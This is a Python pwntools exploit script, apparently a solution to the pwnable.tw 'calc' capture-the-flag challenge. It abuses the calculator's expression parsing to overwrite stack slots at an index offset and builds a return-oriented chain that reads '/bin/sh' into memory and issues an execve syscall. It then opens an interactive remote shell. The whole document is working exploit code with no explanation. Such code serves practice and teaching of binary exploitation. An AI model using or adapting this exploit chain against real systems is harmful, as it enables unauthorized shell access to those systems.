#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", '-h']

r = remote('chall.pwnable.tw', 10100)
#r = process('./calc')
#gdb.attach(proc.pidof(r)[0])

r.recvline()

read = 0x806e6d0
bss = 0x80ebf00
pop_ebx_esi_ebp = 0x08048ff4
pop_eax = 0x0805c34b
pop_ecx_ebx = 0x080701d1
pop_edx = 0x080701aa
syscall = 0x08049a21

rop = [read, pop_ebx_esi_ebp, 0, bss, 8, pop_eax, 0xb, pop_ecx_ebx, 0, bss, pop_edx, 0, syscall]

offset = 361 - 1 # this write to calc return address

for i, x in enumerate(rop[::-1]):
    if x == 0: continue
    if (i + 1) < len(rop) and rop[::-1][i+1] == 0:
        r.sendline("+{}+{}".format(offset + len(rop) - 1 - (i + 1), 0x7fffffff))
        r.sendline("+{}+{}".format(offset + len(rop) - 1 - i, (0x100000000 - 0x7fffffff - x)))
        r.sendline("+{}+{}".format(offset + len(rop) - 1 - i, x))
    else: r.sendline("+{}+{}".format(offset + len(rop) - 1 - i, x))

r.send('\n') # break the loop and trigger return

r.send('/bin/sh\x00')

r.interactive()
